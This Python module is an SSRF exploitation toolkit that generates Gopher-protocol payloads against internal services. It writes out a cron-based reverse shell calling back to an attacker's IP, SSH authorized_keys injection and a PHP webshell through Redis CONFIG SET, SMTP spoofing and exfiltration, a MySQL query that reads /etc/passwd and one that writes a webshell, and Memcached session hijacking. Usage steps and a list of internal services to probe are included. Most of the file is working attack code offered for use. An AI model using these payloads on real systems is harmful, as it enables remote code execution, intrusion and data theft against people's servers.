"""
Gopher Protocol Payload Generator for SSRF Exploitation

Generates Gopher protocol payloads for:
- Redis RCE (config overwrite, cron injection, authorized_keys)
- SMTP injection (email spoofing, data exfiltration)
- MySQL exploitation (query execution)
- FastCGI exploitation (PHP-FPM RCE)
- Memcached exploitation

Gopher allows sending arbitrary bytes to services, making it powerful for SSRF.
Format: gopher://host:port/_<payload>
The underscore after the port is required and gets stripped.
"""

import base64
import urllib.parse
from typing import Any


def url_encode_gopher(data: str) -> str:
    """
    URL encode data for Gopher protocol.
    Gopher requires double URL encoding in many SSRF contexts.
    """
    # First encode
    encoded = urllib.parse.quote(data, safe='')
    return encoded


def double_url_encode(data: str) -> str:
    """Double URL encode for nested SSRF contexts."""
    encoded = urllib.parse.quote(data, safe='')
    return urllib.parse.quote(encoded, safe='')


# =============================================================================
# Redis Payloads
# =============================================================================

def generate_redis_rce_cron(
    lhost: str,
    lport: int,
    cron_path: str = "/var/spool/cron/crontabs/root",
) -> dict[str, Any]:
    """
    Generate Redis payload for cron-based reverse shell.

    This exploits Redis CONFIG SET to write to the crontab.

    Args:
        lhost: Attacker's IP address
        lport: Attacker's listening port
        cron_path: Path to crontab file (varies by OS)

    Returns:
        Dict with payload and instructions.
    """
    # Reverse shell cron entry
    cron_entry = f"* * * * * bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

    # Redis commands
    redis_commands = [
        "FLUSHALL",
        f"SET cronshell \"\\n\\n{cron_entry}\\n\\n\"",
        f"CONFIG SET dir {cron_path.rsplit('/', 1)[0]}",
        f"CONFIG SET dbfilename {cron_path.rsplit('/', 1)[1]}",
        "SAVE",
        "QUIT",
    ]

    # Convert to Redis protocol (RESP)
    payload = ""
    for cmd in redis_commands:
        parts = cmd.split(" ", 1)
        if len(parts) == 1:
            # Command without arguments
            payload += f"*1\r\n${len(parts[0])}\r\n{parts[0]}\r\n"
        else:
            # Command with argument
            cmd_name = parts[0]
            args = parts[1].split(" ", 1) if " " in parts[1] else [parts[1]]
            payload += f"*{1 + len(args)}\r\n${len(cmd_name)}\r\n{cmd_name}\r\n"
            for arg in args:
                arg = arg.strip('"')
                payload += f"${len(arg)}\r\n{arg}\r\n"

    gopher_payload = f"gopher://127.0.0.1:6379/_{url_encode_gopher(payload)}"

    return {
        "type": "redis_cron_rce",
        "description": "Redis cron-based RCE via CONFIG SET",
        "payload": gopher_payload,
        "payload_raw": payload,
        "instructions": [
            f"1. Start listener: nc -lvnp {lport}",
            "2. Send the Gopher payload via SSRF",
            "3. Wait up to 1 minute for cron to execute",
        ],
        "requirements": [
            "Redis accessible from SSRF endpoint",
            "Redis not requiring authentication",
            "Write access to cron directory",
        ],
        "cron_paths": {
            "debian": "/var/spool/cron/crontabs/root",
            "centos": "/var/spool/cron/root",
            "alpine": "/etc/crontabs/root",
        },
    }


def generate_redis_ssh_key(
    public_key: str,
    ssh_path: str = "/root/.ssh/authorized_keys",
) -> dict[str, Any]:
    """
    Generate Redis payload to write SSH authorized_keys.

    Args:
        public_key: SSH public key to inject
        ssh_path: Path to authorized_keys file

    Returns:
        Dict with payload and instructions.
    """
    # Ensure proper formatting
    if not public_key.startswith("ssh-"):
        public_key = f"ssh-rsa {public_key}"

    redis_commands = [
        "FLUSHALL",
        f"SET sshkey \"\\n\\n{public_key}\\n\\n\"",
        f"CONFIG SET dir {ssh_path.rsplit('/', 1)[0]}",
        "CONFIG SET dbfilename authorized_keys",
        "SAVE",
        "QUIT",
    ]

    payload = ""
    for cmd in redis_commands:
        parts = cmd.split(" ", 1)
        if len(parts) == 1:
            payload += f"*1\r\n${len(parts[0])}\r\n{parts[0]}\r\n"
        else:
            cmd_name = parts[0]
            args = parts[1].split(" ", 1) if " " in parts[1] else [parts[1]]
            payload += f"*{1 + len(args)}\r\n${len(cmd_name)}\r\n{cmd_name}\r\n"
            for arg in args:
                arg = arg.strip('"')
                payload += f"${len(arg)}\r\n{arg}\r\n"

    gopher_payload = f"gopher://127.0.0.1:6379/_{url_encode_gopher(payload)}"

    return {
        "type": "redis_ssh_key",
        "description": "Redis SSH key injection via CONFIG SET",
        "payload": gopher_payload,
        "instructions": [
            "1. Generate SSH key: ssh-keygen -t rsa -f id_rsa",
            "2. Send the Gopher payload via SSRF",
            "3. SSH: ssh -i id_rsa root@target",
        ],
        "requirements": [
            "Redis accessible from SSRF endpoint",
            "Redis not requiring authentication",
            "SSH enabled on target",
            "Write access to .ssh directory",
        ],
    }


def generate_redis_webshell(
    webroot: str = "/var/www/html",
    filename: str = "shell.php",
) -> dict[str, Any]:
    """
    Generate Redis payload to write a PHP webshell.

    Args:
        webroot: Web root directory
        filename: Webshell filename

    Returns:
        Dict with payload and instructions.
    """
    webshell = "<?php system($_GET['cmd']); ?>"

    redis_commands = [
        "FLUSHALL",
        f"SET shell \"{webshell}\"",
        f"CONFIG SET dir {webroot}",
        f"CONFIG SET dbfilename {filename}",
        "SAVE",
        "QUIT",
    ]

    payload = ""
    for cmd in redis_commands:
        parts = cmd.split(" ", 1)
        if len(parts) == 1:
            payload += f"*1\r\n${len(parts[0])}\r\n{parts[0]}\r\n"
        else:
            cmd_name = parts[0]
            args = parts[1].split(" ", 1) if " " in parts[1] else [parts[1]]
            payload += f"*{1 + len(args)}\r\n${len(cmd_name)}\r\n{cmd_name}\r\n"
            for arg in args:
                arg = arg.strip('"')
                payload += f"${len(arg)}\r\n{arg}\r\n"

    gopher_payload = f"gopher://127.0.0.1:6379/_{url_encode_gopher(payload)}"

    return {
        "type": "redis_webshell",
        "description": "Redis webshell write via CONFIG SET",
        "payload": gopher_payload,
        "webshell_url": f"/{filename}?cmd=id",
        "instructions": [
            "1. Send the Gopher payload via SSRF",
            f"2. Access: http://target/{filename}?cmd=id",
        ],
        "requirements": [
            "Redis accessible from SSRF endpoint",
            "Redis not requiring authentication",
            "Write access to webroot",
        ],
    }


# =============================================================================
# SMTP Payloads
# =============================================================================

def generate_smtp_injection(
    mail_from: str,
    rcpt_to: str,
    subject: str,
    body: str,
    smtp_host: str = "127.0.0.1",
    smtp_port: int = 25,
) -> dict[str, Any]:
    """
    Generate SMTP injection payload via Gopher.

    Can be used to:
    - Send emails from internal SMTP server
    - Exfiltrate data via email
    - Spam/phishing from trusted internal servers

    Args:
        mail_from: Sender email address
        rcpt_to: Recipient email address
        subject: Email subject
        body: Email body
        smtp_host: SMTP server host
        smtp_port: SMTP server port

    Returns:
        Dict with payload and instructions.
    """
    # SMTP commands
    smtp_commands = [
        f"HELO internal.localhost",
        f"MAIL FROM:<{mail_from}>",
        f"RCPT TO:<{rcpt_to}>",
        "DATA",
        f"Subject: {subject}",
        f"From: {mail_from}",
        f"To: {rcpt_to}",
        "",
        body,
        ".",
        "QUIT",
    ]

    # Join with CRLF
    payload = "\r\n".join(smtp_commands)

    gopher_payload = f"gopher://{smtp_host}:{smtp_port}/_{url_encode_gopher(payload)}"

    return {
        "type": "smtp_injection",
        "description": "SMTP email injection via Gopher",
        "payload": gopher_payload,
        "payload_raw": payload,
        "instructions": [
            "1. Modify sender/recipient as needed",
            "2. Send the Gopher payload via SSRF",
            "3. Check recipient inbox",
        ],
        "use_cases": [
            "Send email from internal trusted server",
            "Exfiltrate data via email body",
            "Password reset token theft",
        ],
    }


# =============================================================================
# FastCGI/PHP-FPM Payloads
# =============================================================================

def generate_fastcgi_rce(
    php_file: str = "/var/www/html/index.php",
    command: str = "id",
    fastcgi_host: str = "127.0.0.1",
    fastcgi_port: int = 9000,
) -> dict[str, Any]:
    """
    Generate FastCGI/PHP-FPM RCE payload.

    Exploits PHP-FPM to execute arbitrary PHP code by setting
    PHP_VALUE to auto_prepend_file with php://input.

    Args:
        php_file: Existing PHP file path (must exist)
        command: System command to execute
        fastcgi_host: FastCGI host
        fastcgi_port: FastCGI port

    Returns:
        Dict with payload and instructions.
    """
    # PHP code to execute
    php_code = f"<?php system('{command}'); ?>"

    # FastCGI record structure
    # This is a simplified version - full implementation would need proper
    # FastCGI protocol encoding

    # Headers
    fcgi_params = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": php_file,
        "SCRIPT_NAME": php_file,
        "QUERY_STRING": "",
        "REQUEST_URI": php_file,
        "DOCUMENT_ROOT": "/var/www/html",
        "SERVER_SOFTWARE": "php/fcgiclient",
        "REMOTE_ADDR": "127.0.0.1",
        "REMOTE_PORT": "9985",
        "SERVER_ADDR": "127.0.0.1",
        "SERVER_PORT": "80",
        "SERVER_NAME": "localhost",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "CONTENT_TYPE": "application/x-www-form-urlencoded",
        "CONTENT_LENGTH": str(len(php_code)),
        # The magic: auto_prepend_file to execute our code
        "PHP_VALUE": "auto_prepend_file = php://input",
        "PHP_ADMIN_VALUE": "allow_url_include = On",
    }

    return {
        "type": "fastcgi_rce",
        "description": "PHP-FPM/FastCGI RCE via auto_prepend_file",
        "payload_info": "Use gopherus or similar tool to generate proper FastCGI payload",
        "manual_test": f"gopher://{fastcgi_host}:{fastcgi_port}/_[FASTCGI_ENCODED_PAYLOAD]",
        "php_code": php_code,
        "instructions": [
            "1. Use gopherus: python gopherus.py --exploit fastcgi",
            f"2. Specify PHP file: {php_file}",
            f"3. Specify command: {command}",
            "4. Send generated payload via SSRF",
        ],
        "requirements": [
            "PHP-FPM accessible from SSRF endpoint",
            "Known existing PHP file path",
            "PHP-FPM accepting TCP connections",
        ],
        "tool": "https://github.com/tarunkant/Gopherus",
    }


# =============================================================================
# MySQL Payloads
# =============================================================================

def generate_mysql_query(
    query: str,
    username: str = "root",
    mysql_host: str = "127.0.0.1",
    mysql_port: int = 3306,
) -> dict[str, Any]:
    """
    Generate MySQL query execution payload.

    Note: This requires MySQL to be configured without authentication
    or with known empty password.

    Args:
        query: SQL query to execute
        username: MySQL username
        mysql_host: MySQL host
        mysql_port: MySQL port

    Returns:
        Dict with payload and instructions.
    """
    # MySQL protocol is complex - recommend using gopherus
    return {
        "type": "mysql_query",
        "description": "MySQL query execution via Gopher",
        "payload_info": "Use gopherus to generate proper MySQL protocol payload",
        "query": query,
        "instructions": [
            "1. Use gopherus: python gopherus.py --exploit mysql",
            f"2. Specify username: {username}",
            f"3. Specify query: {query}",
            "4. Send generated payload via SSRF",
        ],
        "requirements": [
            "MySQL accessible from SSRF endpoint",
            "MySQL user with no password or known password",
            "FILE privilege for file operations",
        ],
        "useful_queries": [
            "SELECT @@version",
            "SELECT user()",
            "SELECT LOAD_FILE('/etc/passwd')",
            "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'",
        ],
    }


# =============================================================================
# Memcached Payloads
# =============================================================================

def generate_memcached_injection(
    key: str,
    value: str,
    memcached_host: str = "127.0.0.1",
    memcached_port: int = 11211,
) -> dict[str, Any]:
    """
    Generate Memcached injection payload.

    Can be used to:
    - Inject serialized objects for deserialization attacks
    - Modify session data
    - Cache poisoning

    Args:
        key: Memcached key to set
        value: Value to store
        memcached_host: Memcached host
        memcached_port: Memcached port

    Returns:
        Dict with payload and instructions.
    """
    # Memcached SET command
    # set <key> <flags> <exptime> <bytes>\r\n<value>\r\n
    memcached_cmd = f"set {key} 0 0 {len(value)}\r\n{value}\r\n"

    gopher_payload = f"gopher://{memcached_host}:{memcached_port}/_{url_encode_gopher(memcached_cmd)}"

    return {
        "type": "memcached_injection",
        "description": "Memcached key injection via Gopher",
        "payload": gopher_payload,
        "payload_raw": memcached_cmd,
        "instructions": [
            "1. Identify valuable keys (session IDs, cache keys)",
            "2. Craft payload for injection",
            "3. Send the Gopher payload via SSRF",
        ],
        "use_cases": [
            "Session hijacking (overwrite session data)",
            "Cache poisoning",
            "Serialized object injection for RCE",
        ],
    }


# =============================================================================
# Payload Collection Generator
# =============================================================================

def generate_all_ssrf_payloads(
    target_ip: str = "127.0.0.1",
    attacker_ip: str | None = None,
    attacker_port: int = 4444,
) -> dict[str, list[dict[str, Any]]]:
    """
    Generate a collection of SSRF payloads for common internal services.

    Args:
        target_ip: Target internal IP
        attacker_ip: Attacker's IP for reverse shells
        attacker_port: Attacker's listening port

    Returns:
        Dict with payloads organized by service type.
    """
    payloads: dict[str, list[dict[str, Any]]] = {
        "redis": [],
        "smtp": [],
        "fastcgi": [],
        "mysql": [],
        "memcached": [],
    }

    # Redis payloads
    if attacker_ip:
        payloads["redis"].append(generate_redis_rce_cron(attacker_ip, attacker_port))

    payloads["redis"].append(generate_redis_webshell())
    payloads["redis"].append({
        "type": "redis_info",
        "description": "Redis INFO command for reconnaissance",
        "payload": f"gopher://{target_ip}:6379/_{url_encode_gopher('INFO\r\nQUIT\r\n')}",
    })

    # SMTP payloads
    payloads["smtp"].append(generate_smtp_injection(
        mail_from="ssrf@internal.local",
        rcpt_to="attacker@example.com",
        subject="SSRF Test",
        body="This email was sent via SSRF.",
    ))

    # FastCGI payloads
    payloads["fastcgi"].append(generate_fastcgi_rce())

    # MySQL payloads
    payloads["mysql"].append(generate_mysql_query("SELECT @@version"))

    # Memcached payloads
    payloads["memcached"].append(generate_memcached_injection(
        key="test_key",
        value="test_value",
    ))
    payloads["memcached"].append({
        "type": "memcached_stats",
        "description": "Memcached stats for reconnaissance",
        "payload": f"gopher://{target_ip}:11211/_{url_encode_gopher('stats\r\nquit\r\n')}",
    })

    return payloads


def get_common_internal_services() -> list[dict[str, Any]]:
    """
    Get list of common internal services to probe via SSRF.

    Returns:
        List of service definitions with ports and payloads.
    """
    return [
        {
            "service": "redis",
            "default_port": 6379,
            "probe_payload": "gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A",
            "indicators": ["redis_version", "connected_clients"],
        },
        {
            "service": "memcached",
            "default_port": 11211,
            "probe_payload": "gopher://127.0.0.1:11211/_stats%0D%0Aquit%0D%0A",
            "indicators": ["STAT", "bytes", "curr_items"],
        },
        {
            "service": "mysql",
            "default_port": 3306,
            "probe_payload": None,  # Complex protocol, use gopherus
            "indicators": ["mysql", "MariaDB"],
        },
        {
            "service": "postgresql",
            "default_port": 5432,
            "probe_payload": None,  # Complex protocol
            "indicators": ["PostgreSQL"],
        },
        {
            "service": "mongodb",
            "default_port": 27017,
            "probe_payload": None,  # Binary protocol
            "indicators": ["mongodb"],
        },
        {
            "service": "elasticsearch",
            "default_port": 9200,
            "probe_payload": "http://127.0.0.1:9200/",  # HTTP based
            "indicators": ["cluster_name", "elasticsearch"],
        },
        {
            "service": "php-fpm",
            "default_port": 9000,
            "probe_payload": None,  # FastCGI protocol, use gopherus
            "indicators": [],
        },
        {
            "service": "smtp",
            "default_port": 25,
            "probe_payload": "gopher://127.0.0.1:25/_HELO%20test%0D%0AQUIT%0D%0A",
            "indicators": ["220", "SMTP", "ESMTP"],
        },
        {
            "service": "docker_api",
            "default_port": 2375,
            "probe_payload": "http://127.0.0.1:2375/version",
            "indicators": ["ApiVersion", "Arch", "KernelVersion"],
        },
        {
            "service": "kubernetes_api",
            "default_port": 6443,
            "probe_payload": "https://127.0.0.1:6443/api",
            "indicators": ["kind", "apiVersion"],
        },
    ]
